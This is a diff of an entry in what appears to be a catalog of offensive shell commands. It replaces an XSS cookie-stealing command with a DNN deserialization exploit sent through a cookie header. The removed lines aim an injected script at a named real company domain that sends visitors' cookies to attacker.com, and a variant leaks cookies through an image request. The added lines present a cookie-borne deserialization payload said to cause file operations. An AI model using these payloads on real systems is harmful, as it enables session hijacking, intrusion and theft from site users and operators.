@@ -1,22 +1,22 @@
 ---
+id: uuid-placeholder-c3
 data: >-
-  curl -X GET
-  "https://developer.gm.com/search?query=%3Cscript%3Efetch('http://attacker.com/steal?data='+btoa(document.cookie))%3C/script%3E"
-  -v
+  curl -v "https://target.com/nonexistent-page" -H "Cookie:
+  DNNPersonalization=<xml-payload>"
 tags:
-  - xss
-  - exploitation
-  - web
+  - exploit
+  - deserialization
 type: command
-output: null
+output: |-
+  HTTP/1.1 404
+  Body with potential reflection
 executor: bash
 platforms:
   - Linux
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:30.950Z'
-id: 5049f2ff-2774-4b7e-93d9-093f40297fd7
+updated_at: '2025-12-14T17:23:54.211Z'
 verified: false
 validated: true
 submitted: true
@@ -26,40 +26,31 @@ submitted: true
 ## Command
 
 ```bash
-curl -X GET "https://developer.gm.com/search?query=%3Cscript%3Efetch('http://attacker.com/steal?data='+btoa(document.cookie))%3C/script%3E" -v
+curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<xml-payload>"
 ```
 
 ## Description
 
-Injects a malicious JavaScript payload via curl to exploit XSS, encoding and sending victim cookies to an attacker server upon execution in the browser.
+Injects XML deserialization payload via cookie to exploit DNN.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X GET` | HTTP method | Yes |
-| `query` | Target parameter | Yes |
-| Payload | Encoded JS for exfiltration | Yes |
-| `-v` | Verbose mode | No |
+| `-H` | Payload in cookie | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl "https://target.com/vuln?param=<script>alert(1)</script>"
-```
-
-### Advanced Usage
-
-```bash
-curl -X GET "https://target.com/vuln?param=%3Cscript%3Enew Image().src='http://attacker.com?'+document.cookie%3C/script%3E" --cookie "session=abc123"
+curl -v -H "Cookie: DNNPersonalization=<profile>...</profile>" https://target.com/404
 ```
 
 ## Expected Output
 
-Server response (200 OK) with reflected payload; actual execution sends data to attacker endpoint when loaded in browser.
+404 with exploitation effects, e.g., file ops.
 
 ## Related
 
-- [[Related Procedure: Inject-and-Execute-Malicious-JavaScript]]
+- [[Related Procedure: Inject-Crafted-Deserialization-Payload-for-File-Write]]
